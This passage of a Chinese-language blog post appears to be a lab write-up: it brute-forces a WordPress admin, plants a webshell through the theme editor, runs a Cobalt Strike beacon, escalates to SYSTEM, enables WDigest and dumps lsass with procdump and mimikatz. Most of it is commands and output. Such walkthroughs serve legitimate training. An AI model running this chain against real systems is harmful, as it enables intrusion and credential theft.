class="string">[+] Memory used: 227.586 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:08:51</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过上面的数据并没有找到有用的信息。接下来尝试获取所有用户。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 wpscan --url http://192.168.153.129 -e u</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.153.129/ [192.168.153.129]</span></span><br><span class="line"><span class="string">[+] Started: Sat Jul  2 09:45:48 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] root</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.153.129/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Sitemap (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.153.129/wp-sitemap-users-1.xml</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sat Jul  2 09:46:30 2022</span></span><br><span class="line"><span class="string">[+] Requests Done: 36</span></span><br><span class="line"><span class="string">[+] Cached Requests: 25</span></span><br><span class="line"><span class="string">[+] Data Sent: 9.471 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 558.291 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 205.469 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:42</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过上面的数据发现只有一个root的用户应该是管理员我们使用<code>wpscan</code>暴力破解看看。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/CS4.4完全汉化版破解]</span><br><span class="line">└─$ proxychains4 wpscan --url http://192.168.153.129 -U root -P top100.txt</span><br><span class="line">...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:6033  ...  192.168.153.129:80  ...  OK</span><br><span class="line">Trying root / 333333 Time: 00:04:30 &lt;=====================================================================================&gt; (99 / 99) 100.00% Time: 00:04:30</span><br><span class="line"></span><br><span class="line">[i] No Valid Passwords Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Jul  2 10:20:15 2022</span><br><span class="line">[+] Requests Done: 239</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 87.511 KB</span><br><span class="line">[+] Data Received: 220.998 KB</span><br><span class="line">[+] Memory used: 229.191 MB</span><br><span class="line">[+] Elapsed time: 00:06:39</span><br></pre></td></tr></table></figure>

<ul>
<li>我目前的密码字典目前不能破解。只能看看会不会有密码泄漏，在靶场搭建页面有密码我们我们就使用该密码尝试登陆。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_10-51-22.png" alt="Screenshot_2022-07-02_10-51-22.png"></p>
<h4 id="上传木马-1"><a href="#上传木马-1" class="headerlink" title="上传木马"></a>上传木马</h4><ul>
<li>接下来我们就可以通过<strong>主题文件编辑器</strong>功能写入一句话木马。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-02-37.png" alt="Screenshot_2022-07-02_11-02-37.png"></p>
<ul>
<li>我选择在<code>inc/patterns/hidden-404.php</code>文件写入命令执行。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-31-18.png" alt="Screenshot_2022-07-02_11-31-18.png"></p>
<ul>
<li>测试写入的代码是否可以执行。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-33-03.png" alt="Screenshot_2022-07-02_11-33-03.png"></p>
<ul>
<li>将上传Windows 7的木马到Windows 10。这里通过在WordPress官网下载随便一个插件然后把我们的木马放进压缩包再上传。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12_13_31.png" alt="Screenshot_2022-07-02_12_13_31.png"></p>
<ul>
<li>然后通过我们在主题写入命令执行该文件就可以了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.129/a -d <span class="string">&quot;1=wp-content\plugins\classic-editor\js\a.ini&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:6033  ...  192.168.153.129:80  ...  OK</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;500 错误 - phpstudy&lt;/title&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12_27_30.png" alt="Screenshot_2022-07-02_12_27_30.png"></p>
<ul>
<li>提升到SYSTEM权限。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; elevate svc-exe b_192.168.153.130</span><br><span class="line">[*] Tasked beacon to run windows/beacon_reverse_tcp (192.168.153.130:4444) via Service Control Manager (\\127.0.0.1\ADMIN$\ba77d60.exe)</span><br><span class="line">[+] host called home, sent: 285738 bytes</span><br><span class="line">[+] host called home, sent: 1819 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service ba77d60 on .</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12-30-57.png" alt="Screenshot_2022-07-02_12-30-57.png"></p>
<ul>
<li><p>接下来就是抓取明文密码了。由于Windows 10抓取密码方式不一样，需要先修改注册表等待重新登陆再截取dmp文件。</p>
</li>
<li><p>修改注册表。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line">[*] Tasked beacon to run: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line">[+] host called home, sent: 145 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>logoff</code>命令注销windows10用户。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell logoff</span><br><span class="line">[*] Tasked beacon to run: logoff</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"><span class="string">&#x27;logoff&#x27;</span> 不是内部或外部命令，也不是可运行的程序</span><br><span class="line">或批处理文件。</span><br></pre></td></tr></table></figure>

<ul>
<li>在CS无法执行<code>logoff</code>命令，只能通过命令执行。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.129/a -d <span class="string">&quot;1=logoff&quot;</span>                    </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:6033  ...  192.168.153.129:80  ...  OK</span><br></pre></td></tr></table></figure>

<ul>
<li>上传<code>procdump64.exe</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; upload</span><br><span class="line">[*] Tasked beacon to upload /home/kali/Desktop/procdump64.exe as procdump64.exe</span><br><span class="line">[+] host called home, sent: 401322 bytes</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>procdump64.exe</code>抓取dmp文件。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br><span class="line">[*] Tasked beacon to run: procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br><span class="line">[+] host called home, sent: 77 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">ProcDump v10.11 - Sysinternals process dump utility</span><br><span class="line">Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">[01:08:16] Dump 1 initiated: C:\phpstudy_pro\WWW\1.dmp</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">[01:08:18] Dump 1 writing: Estimated dump file size is 46 MB.</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">[01:08:19] Dump 1 complete: 46 MB written <span class="keyword">in</span> 2.4 seconds</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">[01:08:19] Dump count reached.</span><br></pre></td></tr></table></figure>

<ul>
<li>下载dmp文件。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; download 1.dmp</span><br><span class="line">[*] Tasked beacon to download 1.dmp</span><br><span class="line">[+] host called home, sent: 13 bytes</span><br><span class="line">[*] started download of C:\phpstudy_pro\WWW\1.dmp (46832222 bytes)</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>mimikatz</code>读取密码。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ wine /usr/share/windows-resources/mimikatz/x64/mimikatz.exe <span class="string">&quot;sekurlsa::minidump e723ff153&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br><span class="line">0040:err:winediag:SECUR32_initNTLMSP ntlm_auth was not found or is outdated. Make sure that ntlm_auth &gt;= 3.0.25 is <span class="keyword">in</span> your path. Usually, you can find it <span class="keyword">in</span> the winbind package of your distribution.</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line">&gt;&gt;&gt; INIT of <span class="string">&#x27;kerberos&#x27;</span> module failed : c0000001</span><br><span class="line">0050:err:ole:start_rpcss Failed to open RpcSs service</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::minidump e723ff153</span></span><br><span class="line">Switch to MINIDUMP : <span class="string">&#x27;e723ff153&#x27;</span></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonPasswords full</span></span><br><span class="line">Opening : <span class="string">&#x27;e723ff153&#x27;</span> file <span class="keyword">for</span> minidump...</span><br><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Local LSA library failed</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<ul>
<li><p>通过上方的返回结果应该是给杀毒拦截了。</p>
</li>
<li><p>尝试使用CS抓取明文密码功能发现可以直接抓到。</p>
</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_23-43-19.png" alt="Screenshot_2022-07-02_23-43-19.png"></p>
<h2 id="完"><a href="#完" class="headerlink" title="完"></a>完</h2></div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/07/19/tcpdump%20%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/">prev</a><a class="next" href="/2022/05/30/smbclient-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/">next</a></div><div class="copyright"><p>&copy; 2022 <a href="http://webb-l.top">Webb</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
    Barba.Pjax.start()
})</script></body></html>